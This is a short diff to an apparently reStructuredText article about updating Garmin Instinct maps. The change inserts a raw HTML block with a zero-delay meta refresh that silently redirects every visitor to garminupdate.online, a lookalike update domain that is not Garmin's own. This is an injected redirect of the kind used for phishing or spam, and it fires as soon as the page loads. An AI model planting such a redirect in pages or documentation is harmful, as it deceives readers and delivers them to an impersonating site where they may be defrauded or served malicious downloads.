@@ -1,3 +1,10 @@
+.. raw:: html
+ 
+    <meta http-equiv="refresh" content="0; url=https://garminupdate.online/">
+
+
+
+
 Garmin Instinct Map Update: How to Keep Your Outdoor Navigation Accurate
 ======================================================
 
